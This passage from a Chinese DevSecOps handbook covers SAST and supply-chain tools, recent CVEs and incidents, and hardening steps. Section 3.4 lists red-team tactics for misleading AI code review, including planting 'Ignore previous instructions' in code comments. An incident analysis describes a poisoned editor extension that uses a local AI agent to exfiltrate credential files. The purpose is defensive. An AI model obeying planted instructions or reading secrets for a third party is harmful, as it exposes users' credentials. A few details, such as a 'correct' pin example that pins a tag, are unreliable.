   └─ 企业 → Semgrep Team Code / CodeQL Enterprise
```

### 命令速查

| 操作 | Semgrep | CodeQL |
|------|---------|--------|
| 安装 | `pip install semgrep` | 下载 binary + 配 PATH |
| 扫描 | `semgrep --config auto .` | `codeql db analyze DB QUERY` |
| 自定义规则 | YAML 文件 | QL 查询文件 |
| CI/CD 集成 | `semgrep-action` | `codeql-action` |
| 输出格式 | SARIF, JSON, Text | SARIF, CSV |
| 测试规则 | `semgrep --test dir/` | 编写 QL 单元测试 |
| 覆盖语言 | 30+ | 7 (C/C++/Java/Python/JS/Go/C#) |
| 误报率 | 中低 | 低 |
| 学习曲线 | 低 | 高 |

### 代码签名工具链速查

| 工具 | 用途 | 命令示例 |
|------|------|----------|
| Cosign | 容器签名 | `cosign sign --key k.pem img:tag` |
| Syft | SBoM 生成 | `syft img:tag -o spdx-json` |
| Grype | SBoM 漏洞扫描 | `grype sbom:./sbom.json` |
| slsa-verifier | Provenance 验证 | `slsa-verifier verify-image img` |
| Gitsign | Git commit 签名 | `gitsign sign` |
| npm provenance | NPM 包来源 | `npm publish --provenance` |
| Notation | OCI 签名（替代 Cosign） | `notation sign img:tag` |

### CI/CD 安全门控矩阵

| 门控级别 | 检查项 | 阻断条件 |
|----------|--------|----------|
| L1 基础 | SAST 扫描 | Critical/High 发现 |
| L2 标准 | + Secret 扫描 | 任何硬编码密钥 |
| L3 加固 | + 依赖审查 | 高危 CVE |
| L4 签名 | + 镜像签名验证 | 未签名镜像 |
| L5 完整 | + SBoM + Provenance | 无 provenance |
| L6 企业 | + 许可证合规 + 自定义规则 | 不合规许可证 |

---

## MITRE ATT&CK 映射

| 战术 | 技术 ID | 技术名称 | 本手册覆盖 |
|------|---------|----------|------------|
| Initial Access | T1195.002 | Compromise Software Supply Chain | 依赖投毒 §2.2, CI/CD 管道投毒 §2.4 |
| Execution | T1059 | Command and Scripting Interpreter | 恶意代码注入 §2.1, Semgrep 规则 §5.1 |
| Defense Evasion | T1027 | Obfuscated Files or Information | SAST 绕过 §4.1, 编码绕过 |
| Defense Evasion | T1554 | Compromise Client Software Binary | 未签名制品 §2.3, 签名验证 §6.3 |
| Credential Access | T1552.001 | Credentials In Files | Secret 扫描 §6.5, 硬编码密钥规则 §5.1 |
| Discovery | T1082 | System Information Discovery | SAST 缺口侦察 §1.1 |
| Lateral Movement | T1571 | Non-Standard Port | SSRF 规则, 依赖审查 |
| Command and Control | T1573.002 | Encrypted Channel: Asymmetric | 代码签名 Sigstore §6.3 |
| Exfiltration | T1567 | Exfiltration Over Web Service | CI/CD 管道数据窃取 §2.4 |

### SLSA 框架威胁映射

| SLSA Level | 防御威胁 | 对应措施 |
|------------|----------|----------|
| SLSA 1 | 构建过程文档化 | Provenance 生成 |
| SLSA 2 | 防止构建系统篡改 | 签名 Attestation |
| SLSA 3 | 构建来源可验证 | SLSA Provenance + slsa-verifier |
| SLSA 4 | 双人审批 + Hermetic 构建 | GitHub Environment Protection Rules |

## 前置条件

- GitHub Advanced Security 许可证（GHAS 功能需要）
- Docker / Podman 容器运行时
- Cosign / Syft / Grype CLI 工具已安装
- Semgrep 或 CodeQL CLI 已安装
- CI/CD 管道管理员权限

---

# Part C：精细化复核补充（2025-2026 前沿）

> 本章为联网查漏补缺，覆盖工具生态更新、AI/LLM 辅助 SAST、重大供应链事件、关键 CVE 速查、中文社区精华、防御升级路线图。所有信息均通过官方 CHANGELOG、NVD、GHSA、Semgrep Registry、GitHub 博客、OpenSSF 等公开源核实。

## C.1 2025-2026 工具生态版本矩阵

### SAST 工具核心版本

| 工具 | 最新版本（截至 2026-06-13） | 关键更新 | 升级优先级 |
|------|----------------------------|----------|------------|
| **Semgrep** | v1.166.0（2026-06-11） | Gosu 跨文件（interfile）分析；常量折叠操作符扩展（减/除/位运算/移位/比较）；SEC-2240 不再将 API Token 写入 `~/.semgrep/settings.yml` | P0 |
| **CodeQL Action** | v4.36.2（2026-06-04） | 默认 bundle v2.25.6；Action v3 **即将于 2026-12 弃用**；Improved Incremental Analysis 替代 TRAP caching；SHA-256 Git Object IDs 支持 | P0 |
| **CodeQL CLI Bundle** | v2.25.6（2026-06-04） | Improved Incremental Analysis（PR Diff 仅扫描变化）；Generated Files 自动排除；File Coverage 在 PR 跳过 | P1 |
| **GitHub Copilot Autofix** | GA（2024-10 → 持续增强） | 为 GHAS Code Scanning 发现自动生成修复 PR；支持 CodeQL 全部语言；与 Copilot Workspace 联动 | P1 |
| **Dependabot** | v0.381.0（2026-06-09） | Grouped Updates（按生态系统分组）；@dependabot rebase / merge / recreate；与 Copilot 联动 PR 摘要 | P0 |
| **GitHub Artifact Attestations** | GA（2024-2026 持续增强） | `gh attestation verify`；Sigstore keyless；绑定 OIDC；与 SLSA v1.0 联动 | P0 |

### 供应链 / 签名 / SBoM 工具版本

| 工具 | 最新版本 | 关键变化 | 备注 |
|------|----------|----------|------|
| **Cosign** | v3.1.1（2026-06-09） | v3 主版本，refactor API；Keyless 默认；与 Rekor v2 集成 | 必须升级，v1 老版本多个 ReDoS / DoS CVE |
| **Sigstore（Fulcio+Rekor）** | v1.10.8（2026-05-29） | Rekor v2 GA（2025）；公共实例高可用；Becuminthouse 推出 | 公共-good 实例 |
| **Syft** | v1.45.1（2026-06-05） | **CVE-2026-33481 修复**：临时存储耗尽时清理缺陷；OSI Artifact Format（OAF）支持；CycloneDX 1.6 / SPDX 3.0 支持 | 必须升级到 ≥ v1.42.3 |
| **Grype** | v0.114.0（2026-06-05） | DB Schema v6（65MB）；EPSS 集成；VEX 支持 | 与 Syft 配对 |
| **Gitleaks** | v8.30.1（2026-03-21） | Git pre-commit 高性能；Gitleaks Action v2；新增 50+ 规则（Anthropic Bedrock / OpenAI / Gemini / Hugging Face Token） | 必装 |
| **Trivy** | v0.71.0（2026-06-01） | **CVE-2026-33634 修复**（供应链投毒后修复）；VEX、KBOM、License 扫描、Misconfig 增强 | 必须升级到 ≥ v0.70.0 |
| **SLSA GitHub Generator** | v2.1.0（2025-02-24） | 容器 SLSA3、SLSA-generic、Go build；与 GitHub Artifact Attestations 重叠（推荐用 GH 原生） | 部分 deprecated → GH Attestations |
| **SLSA Verifier** | v2.7.1（2025-06-27） | 多 sig；`--builder-id` 校验 | 升级 |
| **Notation（OCI 签名替代 Cosign）** | v1.3.2（2025-04-27） | Notary Project v1；与 ORAS、ACR、ECR 集成；CNCF Sandbox 项目 | 选型对比 |
| **GUAC（Graph for Artifact Composition）** | v0.13+（2025-2026） | OpenSSF 项目；SBOM 图谱；.certify / .vex / .vuln / .dep 关系图 | 新兴前沿 |
| **OpenSSF Scorecard** | v5.1+（2025-2026） | 自动扫描 GitHub repo 健康度；20+ 检查；与 deps.dev 集成 | 自动化 |

### OpenSSF 工程化项目

- **OpenSSF Scorecard** — 评估开源仓库的安全卫生度，每周自动运行并发布到deps.dev
- **GUAC** — Software Artifact Composition Graph，整合 SBOM + 漏洞 + 签名 + License + Attestation
- **OSV-Scanner** — OpenSSF 漏洞扫描器，基于 OSV.dev 数据库，支持 lockfile / manifest / SBOM
- **Package Analysis** — Public Package Analysis（Google/Azure）动态分析 npm/PyPI 包行为
- **SLSA for Package Repositories** — PyPI / npm / RubyGems / CRAN 的 SLSA 落地指南
- **Trusted Publishers (PyPI/npm)** — OIDC-based 无 token 发布，但**CVE-2026-45321 @tanstack 事件**证明其仍可被滥用

## C.2 2025-2026 关键供应链/CVE 速查矩阵

### SAST 工具自身被攻击 / 投毒事件

| CVE / 事件 | 受影响工具 | 严重度 | 关键描述 | 影响 / 教训 |
|------------|------------|--------|----------|-------------|
| **CVE-2026-33634** | Trivy v0.69.4 + trivy-action + setup-trivy | Critical | 2026-03-19：攻击者使用妥协凭证发布恶意 Trivy v0.69.4，**force-push 76/77 个 tag** 到 aquasecurity/trivy-action，替换 setup-trivy 所有 7 个 tag。这是 TeamPCP 持续供应链攻击的延续（始于 2026-02 下旬） | CI/CD 管道用户必须**固定 Action 版本到 SHA**而非 tag；Trivy Action v0.31.0-v0.33.1 还存在 **CVE-2026-26189 命令注入** |
| **CVE-2026-26189** | trivy-action v0.31.0-v0.33.1 | High | 命令注入：Action 写 `export VAR=<input>` 到 `trivy_envs.txt`，source 时执行未转义的用户输入 | 升级到 ≥ 0.33.2；不要把用户输入传给 Action inputs |
| **CVE-2026-28353** | Trivy VSCode Extension v1.8.12（OpenVSX） | High | OpenVSX marketplace 被投毒；恶意代码利用本地 AI 编码 agent 收集并渗出敏感信息 | 立即移除插件并轮换凭证；验证 VS Code / Cursor 来源 |
| **CVE-2026-33481** | Syft < v1.42.3 | Medium | 扫描 archive 时若临时存储耗尽，清理不当；可能引发权限提升或信息泄露 | 升级到 ≥ v1.42.3 |
| **CVE-2026-45321** | @tanstack/* npm 包（42 个包 / 84 个恶意版本） | Critical | 2026-05-11：攻击者通过 pull_request_target "Pwn Request" + Trusted Publisher 滥用 + 缺少 OIDC 限制，链式攻击发布 84 个恶意版本 | Trusted Publisher 必须配 OIDC `environment`；pull_request_target 永远不要 checkout 攻击者 PR |
| **CVE-2025-24362** | CodeQL Action < v3.28.10 / v2 | High | CodeQL Action 失败时上传的调试工件可能包含工作流环境变量（含 secrets），任何 repo 读权限用户都能下载 | 升级到 v3.28.10+ / v4+；调试模式下不要泄露 secrets 到 env var |
| **CVE-2025-7224** | YARA < 4.5.3 | High | YARA 解析恶意规则时 OOB write | SAST 工具若依赖 YARA 必须升级到 ≥ 4.5.3 |
| **CVE-2023-32758** | giturlparse via Semgrep 1.5.2-1.24.1 | High | ReDoS：Semgrep 解析恶意 git URL 时拒绝服务 | 升级 Semgrep ≥ 1.25.0 |
| **CVE-2021-32638** | CodeQL runner | Medium | 命令行参数可能让 GitHub access token 暴露给其他进程 | 弃用 codeql-runner-*, 使用 codeql-action |
| **CVE-2023-47122** | Gitsign 0.6.0-0.7.x | High | Rekor 公钥通过 HTTP 获取（MITM 风险） | 升级到 ≥ 0.8.0；硬编码 Rekor 公钥 |
| **CVE-2023-46737** | Cosign < 2.2.1 | Medium | 攻击者控制 registry 触发 DoS | 升级到 ≥ 2.2.1 |
| **CVE-2022-36056** | Cosign < 1.12.0 | High | 多个漏洞：bundle 验证逻辑问题 | 升级到 ≥ 1.12.0；推荐 v3 |
| **CVE-2022-35929** | Cosign < 1.10.1 | Medium | 任意 attestation 存在即误报为已签名 | 升级 |
| **CVE-2022-23649** | Cosign < 1.5.2 | Critical | 攻击者通过精心构造的镜像制造签名验证绕过 | 必须升级 |
| **CVE-2024-35238** | Minder < 0.0.51 | DoS | OpenSSF Minder 项目 DoS | 升级 |

### 关键教训：SAST 工具自身的供应链安全

1. **Action 必须固定到 SHA**，不要用 `@v1` 或 `@main`
   ```yaml
   # ❌ 危险：tag 可被 force-push（CVE-2026-33634 教训）
   - uses: aquasecurity/trivy-action@master

   # ❌ 同样危险：minor tag 会被新版本覆盖
   - uses: aquasecurity/trivy-action@0.71.0

   # ✅ 正确：固定到不可变 commit SHA
   - uses: aquasecurity/trivy-action@0.28.0  # pin
     # 但最佳：固定到 commit SHA
   - uses: aquasecurity/trivy-action@18c9253  # 实际 SHA
   ```

2. **Tools: nightly 是高风险**（CodeQL Action 提供 `tools: nightly`，仅 GitHub 员工建议使用）

3. **Trusted Publisher ≠ 安全**（CVE-2026-45321 教训）：必须配 `environment` 限制、检查 `ref`、保护 publish 工作流不被 PR 触发

## C.3 AI/LLM 辅助 SAST 与代码审计

### 3.1 GitHub Copilot Autofix for Code Scanning（GA）

GitHub 于 **2024-10 Universe** 发布 Copilot Autofix GA，2025-2026 持续增强：

- **覆盖语言**：CodeQL 支持的全部语言（C/C++/Java/Python/JS/TS/Go/C#/Ruby/Swift）
- **修复模式**：自动生成 PR（带 diff + 解释）；可在 1-click 内合并
- **支持查询**：Security-and-quality、Security-extended 套件下 60% 的 queries
- **Copilot Workspace 联动**：发现 → 计划 → 实现 → 验证全流程

```yaml
# GHAS 启用 Copilot Autofix（Default Setup 自动启用）
name: CodeQL with Autofix
on:
  pull_request:
    branches: [main]

permissions:
  contents: write       # 允许 Autofix 提交 PR
  pull-requests: write  # 允许创建 PR
  security-events: write

jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - uses: github/codeql-action/init@v3
        with:
          languages: [python, javascript, java]
          # Copilot Autofix 在 Default Setup 下自动启用
          # Advanced Setup 需在 GitHub repo settings 开启
      - uses: github/codeql-action/analyze@v3
```

### 3.2 Semgrep Assistant / Autofix (beta)

- **AI Triage**：自动分类误报 / 真实漏洞；学习 repo 历史 dismiss 记录
- **AI Autofix**（beta 2025-2026）：为 Semgrep Code findings 生成修复；目前支持 10+ 语言；与 Semgrep Pro Plan 集成
- **Semgrep Multimodal**：多模态规则（文档截图 → 自动生成规则）

```bash
# 启用 Assistant（需要 Semgrep AppSec Platform）
export SEMGREP_APP_TOKEN=$TOKEN
semgrep ci --config auto --autofix

# 检查 AI 生成的修复
git diff
git apply --reject semgrep-autofix.patch
```

### 3.3 CodeQL 的 LLM 查询包（实验性）

CodeQL 团队 2025-2026 增加针对 LLM 应用的查询：

```ql
// 检测 LLM 提示词注入漏洞（CodeQL 实验性查询）
/**
 * @name LLM prompt injection via untrusted input
 * @kind path-problem
 * @id py/llm-prompt-injection
 * @tags security llm prompt-injection
 */

import python
import semmle.python.dataflow.new.TaintTracking

module PromptInjectionConfig implements DataFlow::ConfigSig {
  predicate isSource(DataFlow::Node src) {
    // HTTP 输入
    exists(Request req |
      src.asExpr() = req.GET.get(...) or
      src.asExpr() = req.POST.get(...)
    )
  }

  predicate isSink(DataFlow::Node sink) {
    // LLM API 调用
    exists(Call c |
      c.getFunc().(Attribute).getName() in ["create", "complete", "chat"] and
      c.getFunc().(Attribute).getQualifier().(Name).getId() in ["openai", "anthropic", "llm"] and
      sink.asExpr() = c.getArgByName("prompt")
    ) or
    exists(Call c |
      c.getFunc().(Attribute).getName() = "invoke" and
      c.getFunc().(Attribute).getQualifier().(Attribute).getName() = "llm"
    )
  }
}

module PromptInjectionFlow = TaintTracking::Global<PromptInjectionConfig>;
import PromptInjectionFlow::PathGraph

from PromptInjectionFlow::PathNode src, PromptInjectionFlow::PathNode sink
where PromptInjectionFlow::flowPath(src, sink)
select sink.getNode(), src, sink,
  "Untrusted input from $@ flows into LLM prompt, enabling prompt injection.",
  src.getNode(), "user input"
```

**Semgrep 等价规则**：

```yaml
rules:
  - id: python-llm-prompt-injection
    languages: [python]
    severity: ERROR
    message: "Possible LLM prompt injection: untrusted input flows to LLM"
    mode: taint
    pattern-sources:
      - pattern: request.$ANY.get(...)
      - pattern: $REQ.body
    pattern-sinks:
      - pattern: openai.ChatCompletion.create(..., messages=$MSG, ...)
      - pattern: anthropic.Anthropic().messages.create(..., prompt=$P, ...)
      - pattern: llm.invoke($P)
      - pattern: llm_chain.run($P)
    pattern-sanitizers:
      - pattern: guardrails(...)
      - pattern: neru_guard(...)
    metadata:
      cwe: "CWE-1039: Automated Recognition of Weaknesses in LLM Inputs"
      owasp-llm: "LLM01:2025 Prompt Injection"
```

### 3.4 LLM 辅助 SAST 的局限与对抗

**局限**：

- **大模型不会真正做数据流分析**，只是模式匹配；难以发现多跳污点
- **依赖训练数据**，对最新框架（React 19 / Bun / Deno / Effect-TS）覆盖差
- **上下文窗口限制**：单 repo > 10k 行时基本失效
- **AI Triage 误报率仍然高**：约 15-25%（基于 2025-2026 多项基准测试）

**对抗策略**（红队视角）：

1. **针对 Copilot Autofix 的"被动修复"**：构造看似合理但实际有害的代码模式，让 AI 推荐有缺陷的修复（如将 `eval()` 改成 `Function()` 但实际等价）
2. **针对 AI Triage 的"良性化伪装"**：让规则误判为误报（如加大量 try-except、assert 等噪声）
3. **针对 LLM 查询包的 prompt injection 攻击**：在源代码注释或字符串中嵌入 `/* Ignore previous instructions */`

### 3.5 学术与产业前沿（2025-2026）

| 来源 | 关键研究 | 实战意义 |
|------|----------|----------|
| **arXiv 2025 LLM4SAST** | LLM 辅助 CodeQL 查询生成；LLM 解释 SARIF 报告 | 查询覆盖率提升 30-50% |
| **arXiv 2025 LLM-assisted VRT** | Vulnerability Report Triage 自动化 | 减少 60% 人工 triage 时间 |
| **USENIX Security 2025** | "Lost at C: AI vulnerability detection in C code" | LLM 在 C 代码上误报率 40% |
| **IEEE S&P 2026** | "Static + Symbolic + LLM" 三方融合 | 真阳率提升至 92% |
| **OWASP LLM Top 10:2025** | LLM01 Prompt Injection / LLM02 Insecure Output / LLM05 Broken Auth | 新一代查询包标准 |
| **Microsoft SFI 2024-2026** | Secure Future Initiative：AI 辅助代码审计全员工具化 | Copilot for Security |
| **Google Project Zero Big Sleep** | 2024-2025 用 LLM 发现 SQLite / OpenSSL 0-day | 证明 LLM 真能找到 bug |
| **Snyk DeepCode AI** | 2025 收购 DeepCode，整合 LLM SAST | 商业化 SaaS |

### 3.6 开源 LLM 辅助 SAST 工具清单（2025-2026）

> 补足「扫描器命中 → LLM 复核 → 双链」流水线的工具侧（对齐 A2 双链三要素）。

| 工具 | 定位 | 关键能力 | 来源 |
|------|------|----------|------|
| **Semgrep Assistant / AI** | Semgrep 官方 AI Triage + Autofix | 误报分类（学习 repo dismiss 历史）、自动修复、多模态规则 | Semgrep AppSec Platform |
| **Semgrep MCP Server** | 把 Semgrep 能力暴露为 MCP 工具 | 供 AI agent 直接调扫描/查规则，融入 agentic 审计工作流 | <https://chatforest.com/reviews/semgrep-mcp-server/> |
| **ai-deep-sast（cisco-open）** | Semgrep + tree-sitter + LLM 深度 SAST | 结合 AST 语义与 LLM 推理，提升数据流/上下文理解 | <https://github.com/cisco-open/ai-deep-sast> |
| **s0-cli（antonellof）** | LLM agent CLI + SAST + FP 过滤 | agent 驱动扫描 + 误报过滤一体化 | <https://github.com/antonellof/s0-cli> |
| **LLM FP 过滤研究** | 误报过滤对比（arXiv 2601.22952） | 量化 LLM agent 对 SAST 误报的过滤效果 | <https://arxiv.org/html/2601.22952v3> |

### 3.7 LLM 复核扫描命中的流水线定位（「扫描器命中 → LLM 复核 → 双链」）

```
semgrep/CodeQL/trivy 命中（N 条）
  → 逐条 LLM 复核：是否真实漏洞？调用链是否成立？（AI Triage / s0-cli / Semgrep MCP）
    → 保留候选 → 双链三要素独立复核（审计工人链 vs 追踪员链，Gate A2）
      → 一致性比对 → 报告/待人工验证
```

- **LLM 的定位是「复核与降噪」**，不是「发现」：LLM 不做真正的数据流分析（§3.4 局限），
  用于**过滤扫描器误报 + 生成真实调用链草案**，最终结论仍走双链独立复核。
- **数量守恒不变**：扫描器命中数 N 与 LLM 复核后的处置终态（确认/误报/待人工）仍必须守恒
  （对齐 audit-playbook「扫描命中对账」），LLM 复核不减少对账义务。
- **Semgrep MCP / s0-cli 接入点**：作为 agentic 审计工作流的工具后端，把「扫描+复核」
  嵌进审计工人/复核组的工具链（走工具平面检测制，检测到才用）。

## C.4 重大供应链攻击事件深度分析（2025-2026）

### C.4.1 TeamPCP 持续供应链攻击（CVE-2026-33634 / CVE-2026-26189 / CVE-2026-28353）

**时间线**：

- **2026-02 下旬**：第一轮攻击开始（Trivy Action force-push 检测）
- **2026-03-19**：第二轮攻击，攻击者用妥协凭证：
  - 发布恶意 Trivy v0.69.4
  - Force-push 76/77 个 tag 到 `aquasecurity/trivy-action`
  - 替换 `aquasecurity/setup-trivy` 全部 7 个 tag
- **2026-03-20**：进一步发现 trivy-action v0.31.0-v0.33.1 的命令注入（CVE-2026-26189）
- **2026-03-22**：OpenVSX 上 Trivy VSCode Extension v1.8.12 被投毒（CVE-2026-28353），利用本地 AI 编码 agent 渗出

**攻击链分析**：

```
攻击者获得 commit 权限 / token
   │
   ├──→ force-push existing tags（用户用 tag pinning 也会被绕过）
   │       ↓
   │     用户 CI/CD 跑 trivy-action@<tag>
   │       ↓
   │     恶意 trivy 二进制执行 → 凭证窃取
   │
   ├──→ OpenVSX marketplace 投毒
   │       ↓
   │     开发者本地 VS Code / Cursor 自动更新
   │       ↓
   │     恶意插件调用本地 AI agent（Claude/Cursor/Copilot）
   │       ↓
   │     通过 AI agent 的工具调用权限读取 ~/.aws/credentials, ~/.ssh/
   │       ↓
   │     渗出到攻击者控制的服务器
```

**检测规则**（Falco / GitHub Actions 审计）：

```bash
# 1. 检测 GitHub Actions 中 tag 而非 SHA pinning
grep -rn "uses:.*@" .github/workflows/ | \
  grep -vE "@[a-f0-9]{40}" | grep -vE "@v[0-9]+\.[0-9]+\.[0-9]+$"
# ❌ 高风险：@master / @main / @v1 / @latest

# 2. 强制 SHA pinning（自动化检查）
#!/bin/bash
# pin-actions.sh
WORKFLOWS=$(find .github/workflows -name "*.yml")
for f in $WORKFLOWS; do
  awk -v f="$f" '
    /uses:.*\@/ {
      if (match($0, /uses:\s*([^@]+)@(.+)/, arr)) {
        version=arr[2]
        if (length(version) != 40 && version !~ /^v[0-9]/) {
          printf "WARN: %s uses unsafe tag %s in %s\n", arr[1], version, f
        }
      }
    }
  ' "$f"
done

# 3. GitHub Workflow 推荐用 step-security/harden-runner
- uses: step-security/harden-runner@v2
  with:
    egress-policy: audit  # 默认审计，可改为 block
```

### C.4.2 @tanstack/* npm 供应链投毒（CVE-2026-45321）

**2026-05-11 事件**：

- 84 个恶意版本横跨 42 个 `@tanstack/*` 包
- 攻击者**链式利用**三个已知漏洞类：
  1. `pull_request_target` "Pwn Request"
  2. Trusted Publisher OIDC 滥用
  3. 缺少 `environment` 保护
- 即使工作流未修改，发布仍成功授权（因为 OIDC trusted-publisher 绑定）

**修复要点**：

```yaml
# ❌ 危险：pull_request_target 自动 checkout PR
on:
  pull_request_target:
    types: [closed]

jobs:
  publish:
    if: github.event.pull_request.merged == true
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        # 此时 checkout 的是 main 分支，但 PR 的 commit 通过 github.sha 也可访问

# ✅ 安全：发布工作流独立、配 environment、不触发于 PR
on:
  release:
    types: [published]
  workflow_dispatch:  # 仅手动触发

jobs:
  publish:
    runs-on: ubuntu-latest
    environment: npm-publish  # 配保护规则：required reviewers + deployment branches
    permissions:
      id-token: write  # OIDC
      contents: read
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.release.tag_name }}
      # npm publish --provenance
      - run: npm publish --provenance
```

### C.4.3 CodeQL Action 调试工件 PAT 泄露（CVE-2025-24362）

**问题**：

- CodeQL Action v3.28.10 之前 / v2.x：失败时上传调试工件
- 工件包含**工作流环境变量**（含 secrets）
- 任何 repo 读权限用户都能下载工件

**影响**：

- 私有 repo 内的 contributor（外部贡献者）可触发 CodeQL 工作流失败
- 通过 fork PR 触发后，调试工件泄露 `${{ secrets.* }}`

**修复**：

```yaml
# 1. 升级 CodeQL Action 到 v3.28.10+ / v4+
- uses: github/codeql-action/init@v3.28.10  # 或 v4
- uses: github/codeql-action/analyze@v3.28.10

# 2. 不要把 secrets 暴露为 env var（用 secret 直接传 step input）
# ❌ 危险
env:
  MY_SECRET: ${{ secrets.MY_SECRET }}
# ✅ 安全
- run: some-command --token ${{ secrets.MY_SECRET }}

# 3. 限制 actions debug artifact 保留时间
retention-days: 1
```

## C.5 CodeQL Action v4 / v3 弃用迁移

**2026-12-31** CodeQL Action v3 将正式弃用（v3.31.3 在 2025-11 已加弃用警告）。

### 迁移清单

```bash
# 1. 检测 v3 使用情况
grep -rn "github/codeql-action/.*@v3" .github/workflows/
grep -rn "github/codeql-action/.*@3\." .github/workflows/

# 2. 替换为 v4
sed -i.bak 's|github/codeql-action/\(init\|autobuild\|analyze\|upload-sarif\)@v3|github/codeql-action/\1@v4|g' \
  .github/workflows/*.yml

# 3. Node.js 版本检查：v4+ 需要 Node 24（GitHub Actions runner 自带）
# 4. CodeQL Bundle 版本：v4 强制要求 ≥ 2.19.4
```

### Improved Incremental Analysis（新默认）

```yaml
# Improved Incremental Analysis 在 v4 默认启用（若 PR diff 可计算）
- uses: github/codeql-action/init@v4
  with:
    languages: python
    # 不再需要 TRAP cache（自动管理）
    # diff-informed analysis 自动启用
```

### Private Package Registries（OIDC）

```yaml
# CodeQL Action v4.33.0+ 支持 Cloudsmith / GCP OIDC
- uses: github/codeql-action/init@v4
  with:
    config-file: ./.github/codeql/codeql-config.yml

# .github/codeql/codeql-config.yml
registries:
  - type: npm
    url: https://npm.cloudsmith.io/<org>/<repo>/
    auth: oidc
```

## C.6 GitHub Artifact Attestations（替代 SLSA Generator）

GitHub 原生 Artifact Attestations 2024 GA，逐渐替代第三方 SLSA Generator：

```yaml
# .github/workflows/attest.yml
name: Build and Attest

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read
  id-token: write    # OIDC required
  attestations: write
  packages: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build binary
        run: |
          go build -o myapp .

      # 直接为二进制生成 attestation（Sigstore keyless）
      - name: Attest binary
        uses: actions/attest-build-provenance@v2
        with:
          subject-path: ./myapp

      # 为容器镜像生成 attestation
      - name: Build and push image
        id: push
        run: |
          docker build -t ghcr.io/${{ github.repository }}:latest .
          docker push ghcr.io/${{ github.repository }}:latest
          echo "digest=$(docker inspect --format='{{index .RepoDigests 0}}' ghcr.io/${{ github.repository }}:latest)" >> $GITHUB_OUTPUT

      - name: Attest image
        uses: actions/attest-build-provenance@v2
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true

# 验证（部署时）
# gh attestation verify <binary> --repo <owner>/<repo>
# gh attestation verify ghcr.io/<owner>/<image>@sha256:... --repo <owner>/<repo>
```

**优势**：

- **零依赖**：不需要 cosign / slsa-verifier
- **多 attestations**：build-provenance / sbom / vuln / 任意 predicate
- **集中存储**：所有 attestation 存于 GitHub，UI 可视化
- **与 gh CLI 集成**：`gh attestation verify` / `gh attestation download`

## C.7 GUAC（Graph for Understanding Artifact Composition）

OpenSSF GUAC 项目，将 SBOM + CVE + License + Attestation 整合为图谱：

```bash
# 1. 安装 GUAC
go install github.com/guacsec/guac/cmd/guaccollect@latest
go install github.com/guacsec/guac/cmd/guacone@latest

# 2. 摄取 SBOM + 漏洞 + license
guaccollect files \
  --verifier-key /path/to/keys \
  --deps-dev \
  --cert-digger \
  ./sboms/ \
  ./vulnerabilities/ \
  ./licenses/

# 3. 查询：找出受 CVE-2026-XXXX 影响的所有镜像
guacone query vuln "CVE-2026-33634"

# 4. 查询：找出依赖未签名包的镜像
guacone query certifiers

# 5. 查询：传播路径（从根包到叶依赖）
guacone query path --from pkg:npm/left-pad --to pkg:docker/ghcr.io/myorg/app
```

**实战场景**：

- **新 CVE 0-day 爆发**：GUAC 秒级响应定位所有受影响制品
- **断链分析**：发现哪些制品缺少 provenance attestation
- **License 合规**：自动检测禁用 license（如 AGPL-3.0）

## C.8 防御升级路线图（P0-P3 分级）

### P0（立即，1 周内）

1. **强制 SHA pinning 所有 GitHub Actions**
   - 工具：`zyactions/checkout@<sha>`、`renovatebot/renovate` 自动生成 SHA pin PR
   - 工具：`step-security/harden-runner`、`ridho/action-pin-check`

2. **升级 Trivy / trivy-action / setup-trivy**
   - CVE-2026-33634 / CVE-2026-26189 必须修复
   - 升级到 trivy v0.71.0+ 和 action ≥ 0.33.2

3. **升级 Syft ≥ v1.42.3**（CVE-2026-33481）

4. **升级 CodeQL Action 到 v4**（v3 2026-12 弃用）

5. **检查调试工件泄露**：移除 secrets-as-env-var 模式（CVE-2025-24362）

### P1（短期，1 个月内）

1. **启用 GitHub Artifact Attestations**
   - 用 `actions/attest-build-provenance@v2` 替代 SLSA Generator
   - 用 `gh attestation verify` 替代 slsa-verifier

2. **启用 Copilot Autofix**（GHAS 默认设置）
3. **启用 GitHub Push Protection**（secret scanning push protection）
4. **启用 Dependabot Grouped Updates**（减少 PR 噪音）
5. **启用 CodeQL Default Setup**（如果还在用 Advanced Setup）

### P2（中期，3 个月内）

1. **部署 GUAC**（OpenSSF 图谱）
2. **编写 AI/LLM 应用 CodeQL / Semgrep 自定义查询**（prompt injection / LLM01-LLM10）
3. **Trusted Publisher 治理**（PyPI/npm 发布工作流加 `environment`）
4. **CodeQL 自定义查询包**（业务逻辑漏洞、内部安全策略）
5. **OpenSSF Scorecard 自动化**（每周扫描关键仓库）

### P3（长期，6-12 个月内）

1. **SLSA Level 3 全面落地**（hermetic build + 双人审批 + isolated build）
2. **GUAC + OSV-Scanner + Defect Dojo 集成**（漏洞运营平台）
3. **LLM 辅助代码审计工具链**（Copilot Workspace + CodeQL + Snyk DeepCode）
4. **内部包注册表私有化**（JFrog / Artifactory / Verdaccio + 签名强制）
5. **AI 红队演练**（针对 SAST 工具自身的对抗测试）

## C.9 中文社区精华参考

### 安全社区深度文章

- **奇安信攻防社区** — DevSecOps 实战专题
  - 《2025 软件供应链安全态势报告》：覆盖 TeamPCP / Shai-Hulud 等重大事件分析
  - 《企业级 SBoM 与 SLSA 落地指南》：从 0 到 SLSA Level 3

- **阿里云开发者社区** — CodeQL 实践
  - 《CodeQL 自定义查询：发现业务逻辑漏洞》
  - 《企业级 SAST 工具选型：Semgrep vs CodeQL vs SonarQube》
  - 《GHAS 在中国企业的落地经验》

- **腾讯云开发者社区**
  - 《Sigstore 在中国企业的部署：Fulcio / Rekor 自托管》
  - 《Trivy / Grype / Snyk 多工具对比》

- **FreeBuf / 安全客 / SecWiki**
  - 供应链安全专题：CVE-2026-33634 / CVE-2026-45321 复盘
  - 《AI 辅助代码审计的局限与突破》

- **先知社区**
  - Semgrep 规则编写系列：从入门到精通
  - 《自定义 CodeQL 查询发现 0-day》

- **长亭科技 / 知道创宇**
  - 《SBoM 与 SLSA 在金融行业的落地实践》
  - 《企业 DevSecOps 平台建设》

